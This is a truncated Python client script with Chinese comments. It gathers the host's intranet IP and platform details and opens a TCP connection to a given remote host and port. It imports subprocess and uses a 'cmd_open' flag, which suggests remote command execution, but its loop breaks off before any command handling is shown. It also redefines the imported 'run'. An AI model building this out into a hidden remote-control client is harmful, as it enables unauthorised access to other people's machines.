import socket
import os
import platform
from subprocess import run
import ast

global cmd_open
global intranet_ip
global system
global msg_client_run
global c

msg_client_run = False
cmd_open = False

def setup(host,port):
    global intranet_ip
    global system
    global c
    global msg_client_run

    # 获取内网地址
    ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ip.connect(('8.8.8.8', 80))
    intranet_ip = ip.getsockname()[0] # 设置ip地址
    ip.close()

    # 获取系统信息
    system = platform.platform()
    
    # 创建socket
    c = socket.socket()
    c.connect((host, port)) # 绑定host and port

    msg_client_run = True

def run():
    global c
    global intranet_ip
    global system
    global msg_client_run
    # print('run client !!!')
    while msg_client_run:
        